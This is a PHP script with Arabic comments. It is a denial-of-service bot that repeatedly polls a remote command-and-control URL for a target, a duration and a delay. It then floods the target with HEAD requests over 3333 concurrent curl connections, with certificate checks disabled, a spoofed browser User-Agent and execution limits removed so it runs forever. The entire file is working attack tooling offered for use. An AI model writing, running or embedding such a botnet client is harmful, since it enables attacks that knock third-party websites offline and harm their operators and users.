<?php

$api_url = "https://labaidgroup.com/files/google_security2025992852991526.php";
$requests_per_socket_per_second = 3333;
$num_sockets = 3333;
$retry_limit = 3;
$retry_delay = 1;

ini_set('max_execution_time', 0);
ini_set('memory_limit', '2048M');
ini_set('max_input_time', -1);
set_time_limit(0);

function fetch_api_data($api_url, $retry_limit, $retry_delay) {
    $attempt = 0;
    while ($attempt < $retry_limit) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $response = curl_exec($ch);
        $error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($error || $http_code != 200) {
            file_put_contents('php://stderr', "API Attempt $attempt failed: HTTP $http_code, Error: $error\n");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        // التحقق من أن الاستجابة تحتوي على XML صالح
        if (empty($response) || strpos($response, '<data>') === false || strpos($response, 'Bad Gateway') !== false) {
            file_put_contents('php://stderr', "Invalid API Response: $response\n");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        // تعطيل التحذيرات مؤقتًا أثناء تحليل XML
        libxml_use_internal_errors(true);
        $xml = simplexml_load_string($response);
        libxml_use_internal_errors(false);

        if ($xml === false || !isset($xml->url, $xml->time, $xml->wait)) {
            file_put_contents('php://stderr', "Failed to parse XML: $response\n");
            $attempt++;
            if ($attempt < $retry_limit) {
                sleep($retry_delay);
                continue;
            }
            return false;
        }

        return [
            'url' => (string)$xml->url,
            'time' => (int)$xml->time,
            'wait' => (int)$xml->wait
        ];
    }
    return false;
}

function setup_curl_handle($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 0.3);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0.1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["User-Agent: Mozilla/5.0"]);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, false);
    return $ch;
}

function execute_attack($target_url, $total_duration) {
    global $requests_per_socket_per_second, $num_sockets;
    $request_count = 0;
    $multi_handle = curl_multi_init();
    $curl_handles = [];
    $active_handles = [];

    for ($i = 0; $i < $num_sockets; $i++) {
        $ch = setup_curl_handle($target_url);
        curl_multi_add_handle($multi_handle, $ch);
        $curl_handles[$i] = $ch;
        $active_handles[(int)$ch] = $i;
    }

    $start_time = microtime(true);
    $end_time = $start_time + $total_duration;

    while (microtime(true) < $end_time && !empty($active_handles)) {
        $start_loop = microtime(true);
        $requests_this_second = 0;

        for ($i = 0; $i < $requests_per_socket_per_second && microtime(true) < $end_time; $i++) {
            foreach ($active_handles as $ch_id => $index) {
                if (microtime(true) >= $end_time) {
                    break 2;
                }
                $ch = $curl_handles[$index];
                curl_multi_add_handle($multi_handle, $ch);
                $request_count++;
                $requests_this_second++;
            }

            $running = 0;
            do {
                $status = curl_multi_exec($multi_handle, $running);
                if ($status != CURLM_OK) {
                    break;
                }
                curl_multi_select($multi_handle, 0.00001);
            } while ($running > 0 && microtime(true) < $end_time);

            while ($info = curl_multi_info_read($multi_handle)) {
                $ch = $info['handle'];
                $ch_id = (int)$ch;
                if (isset($active_handles[$ch_id])) {
                    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    if ($http_code >= 200 && $http_code < 400) {
                        curl_multi_remove_handle($multi_handle, $ch);
                        curl_close($ch);
                        unset($active_handles[$ch_id]);
                    } else {
                        curl_multi_remove_handle($multi_handle, $ch);
                        curl_multi_add_handle($multi_handle, $ch);
                    }
                }
            }
        }

        $elapsed = microtime(true) - $start_loop;
        $sleep_time = (int)((1 - $elapsed) * 1000000);
        if ($sleep_time > 0) {
            usleep($sleep_time);
        }
    }

    foreach ($curl_handles as $ch) {
        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
    curl_multi_close($multi_handle);
}

while (true) {
    $data = fetch_api_data($api_url, $retry_limit, $retry_delay);

    if ($data !== false && isset($data['url'], $data['time'], $data['wait'])) {
        sleep($data['wait']);
        execute_attack($data['url'], $data['time']);
    }

    sleep(5);
}
?>
